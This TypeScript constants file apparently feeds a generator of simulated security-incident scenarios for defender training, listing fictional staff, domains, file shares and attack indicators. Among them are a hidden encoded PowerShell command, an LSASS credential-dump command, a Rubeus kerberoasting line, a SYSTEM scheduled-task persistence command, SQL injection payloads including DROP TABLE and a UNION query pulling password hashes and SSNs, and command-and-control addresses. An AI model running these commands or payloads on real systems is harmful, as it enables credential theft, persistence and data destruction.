// Curated, realism-vetted content the generator draws from (§7.3). Scoped down to what the
// walking-skeleton scenario needs; breadth-phase work expands this into a real content-team
// -maintained library rather than inline constants.

export const FIRST_NAMES = [
  'Alex',
  'Jordan',
  'Taylor',
  'Morgan',
  'Casey',
  'Riley',
  'Sam',
  'Jamie',
  'Drew',
  'Cameron',
  'Priya',
  'Wei',
  'Fatima',
  'Noah',
  'Olivia',
  'Liam',
  'Emma',
  'Lucas',
  'Sofia',
  'Mateo',
];

export const LAST_NAMES = [
  'Nguyen',
  'Smith',
  'Garcia',
  'Kim',
  'Patel',
  'Johnson',
  'Chen',
  'Müller',
  'Rossi',
  'Kowalski',
  'Andersson',
  'Silva',
  'Khan',
  'Brown',
  'Dubois',
  'Ivanov',
  'Tanaka',
  'Costa',
  'Novak',
  'Haddad',
];

export const DEPARTMENTS = [
  'Finance',
  'Engineering',
  'Sales',
  'Human Resources',
  'IT',
  'Marketing',
  'Legal',
  'Operations',
];

export const JOB_TITLES: Record<string, string[]> = {
  Finance: ['Accounts Payable Specialist', 'Financial Analyst', 'Controller'],
  Engineering: ['Software Engineer', 'DevOps Engineer', 'QA Engineer'],
  Sales: ['Account Executive', 'Sales Development Rep'],
  'Human Resources': ['HR Generalist', 'Recruiter'],
  IT: ['IT Support Specialist', 'Systems Administrator'],
  Marketing: ['Marketing Coordinator', 'Content Strategist'],
  Legal: ['Paralegal', 'Compliance Analyst'],
  Operations: ['Operations Coordinator', 'Supply Chain Analyst'],
};

export const HOSTNAME_PREFIX: Record<string, string> = {
  Finance: 'FIN',
  Engineering: 'ENG',
  Sales: 'SLS',
  'Human Resources': 'HR',
  IT: 'IT',
  Marketing: 'MKT',
  Legal: 'LGL',
  Operations: 'OPS',
};

export const ORG_DOMAIN = 'contoso-finance.example.com';
export const MALICIOUS_DOMAIN = 'secure-invoice-portal-verify.com';
export const LOOKALIKE_INTERNAL_DOMAIN = 'contoso-finance-support.example.com';
export const EXEC_LOOKALIKE_DOMAIN = 'contoso-finance-exec.example.net';
export const EXEC_NAME = 'Morgan Reyes';
export const EXEC_TITLE = 'Chief Financial Officer';
export const PERSONAL_EMAIL_DOMAIN_FOR_GENERATION = 'gmail.com';
export const SENSITIVE_ATTACHMENT_FILENAMES = [
  'Q3_Customer_Contracts_Export.xlsx',
  'Employee_Compensation_Bands_2026.xlsx',
  'Pending_M&A_Due_Diligence_Notes.docx',
];
export const MALWARE_DELIVERY_DOMAIN =
  'billing-statements-delivery.example.org';
export const MALWARE_C2_IP = '185.220.101.47';
export const MALWARE_C2_DOMAIN = 'cdn-update-relay.example.net';
export const RANSOM_NOTE_FILENAME = 'README_DECRYPT.txt';
export const SHARED_FILE_PATHS = [
  'C:\\Shares\\Finance\\Q3_Budget_Forecast.xlsx',
  'C:\\Shares\\Finance\\Vendor_Contracts_2026.docx',
  'C:\\Shares\\HR\\Employee_Records_Backup.xlsx',
  'C:\\Shares\\Engineering\\Source_Archive.zip',
  'C:\\Shares\\Legal\\NDA_Templates.docx',
  'C:\\Shares\\Operations\\Inventory_Master.xlsx',
  'C:\\Shares\\Sales\\Pipeline_Report_Q3.xlsx',
  'C:\\Shares\\Marketing\\Campaign_Assets.pptx',
];
export const FILE_SERVER_IP = '10.20.30.15';

// ---------- Malware — fileless persistence (§1.8) ----------
export const FILELESS_MALWARE_COMMAND_LINE =
  'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQA';
export const MALWARE_PERSISTENCE_STARTUP_PATH =
  'C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinSvcHelper.lnk';
export const LEGITIMATE_STARTUP_SHORTCUT_PATH =
  'C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk';

// ---------- Cloud & Web (§1.8, §6.12.6, §6.12.8) ----------
export const CLOUD_STORAGE_BUCKET = 'contoso-finance-prod-backups';
export const CLOUD_CONSOLE_APPLICATION = 'AWS Management Console';
export const CLOUD_LEGITIMATE_ACTION_NAMES = [
  'ConsoleLogin',
  'DescribeInstances',
  'ListBuckets',
  'GetCallerIdentity',
];
export const WEB_SERVER_HOSTNAME = 'WEB-PROD-01';
export const WEBSHELL_PATH = '/uploads/images/x7f2a9c.php';
export const LEGITIMATE_SCRIPT_PATH = '/api/health-check.php';
export const NON_BROWSER_USER_AGENTS = [
  'curl/7.88.1',
  'python-requests/2.31.0',
  'Wget/1.21.3',
];
export const BROWSER_USER_AGENT =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
export const MONITORING_USER_AGENT = 'curl/7.88.1';

export interface CountryCity {
  country: string;
  city: string;
}

export const HOME_COUNTRIES: CountryCity[] = [
  { country: 'US', city: 'Chicago' },
  { country: 'CA', city: 'Toronto' },
  { country: 'GB', city: 'London' },
  { country: 'DE', city: 'Berlin' },
  { country: 'AU', city: 'Sydney' },
];

export const TRAVEL_COUNTRIES: CountryCity[] = [
  { country: 'FR', city: 'Paris' },
  { country: 'JP', city: 'Tokyo' },
  { country: 'SG', city: 'Singapore' },
  { country: 'MX', city: 'Mexico City' },
];

export const RISKY_UNFAMILIAR_COUNTRIES: CountryCity[] = [
  { country: 'RO', city: 'Bucharest' },
  { country: 'VN', city: 'Hanoi' },
  { country: 'NG', city: 'Lagos' },
];

export const APPLICATIONS = [
  'Office 365 Exchange Online',
  'Salesforce',
  'Workday',
  'Slack',
];

// ---------- Endpoint — credential dumping (§1.8) ----------
export const LSASS_DUMP_COMMAND_LINE_TEMPLATE = (
  pid: number,
  dumpPath: string,
) =>
  `rundll32.exe C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${pid} ${dumpPath} full`;
export const LSASS_DUMP_FILE_PATH = 'C:\\Windows\\Temp\\lsass_dbg.dmp';

// ---------- Insider threat — bulk copy to removable media (§1.8) ----------
export const REMOVABLE_MEDIA_DRIVE = 'E:\\Backup\\';

// ---------- Cloud — public bucket exposure (§1.8) ----------
export const CLOUD_STORAGE_BUCKET_CUSTOMER_EXPORTS =
  'contoso-finance-customer-exports';

// ---------- Web — SQL injection (§1.8) ----------
export const WEB_SQLI_ENDPOINT_PATH = '/api/customers';
export const SQLI_PROBE_PAYLOADS = [
  "1' OR '1'='1",
  "1' OR SLEEP(5)--",
  "1'; DROP TABLE customers--",
  "1' AND 1=CONVERT(int, (SELECT @@version))--",
];
export const SQLI_UNION_EXFIL_PAYLOAD =
  "1' UNION SELECT username,password_hash,ssn FROM customers--";

// ---------- Ransomware — double-extortion data staging (§1.8) ----------
export const RANSOMWARE_EXFIL_IP = '193.106.31.98';

// ---------- Malware — trojanized installer + scheduled task persistence (§1.8) ----------
export const TROJAN_INSTALLER_FILENAME = 'Adobe_Reader_Update_Setup.exe';
export const TROJAN_DROPPED_PAYLOAD_PATH =
  'C:\\Users\\Public\\AppData\\Local\\Temp\\svc_helper.exe';
export const SCHEDULED_TASK_NAME = 'MicrosoftEdgeUpdateTaskMachine';
export const SCHEDULED_TASK_COMMAND_LINE = `schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "${'C:\\Users\\Public\\AppData\\Local\\Temp\\svc_helper.exe'}" /sc onlogon /ru SYSTEM`;

// ---------- Cloud — OAuth illicit consent grant phishing (§1.8) ----------
export const OAUTH_PHISHING_DOMAIN = 'app-reconnect-office365-verify.com';
export const MALICIOUS_OAUTH_APP_NAME = 'Office Sync Helper';

// ---------- Endpoint — Kerberoasting for service-account pivot (§1.8) ----------
export const KERBEROASTING_TOOL_PATH =
  'C:\\Users\\Public\\Downloads\\Rubeus.exe';
export const KERBEROASTING_COMMAND_LINE =
  'Rubeus.exe kerberoast /outfile:C:\\Windows\\Temp\\svc_hashes.txt /format:hashcat';

// ---------- Malware — DNS tunneling C2 and exfiltration (§1.8) ----------
export const DNS_BACKDOOR_TOOL_PATH =
  'C:\\Users\\Public\\Downloads\\NetDiagTool.exe';
export const DNS_BACKDOOR_COMMAND_LINE =
  '"NetDiagTool.exe" --mode covert --relay dns';
export const DNS_TUNNEL_C2_IP = '91.219.237.14';
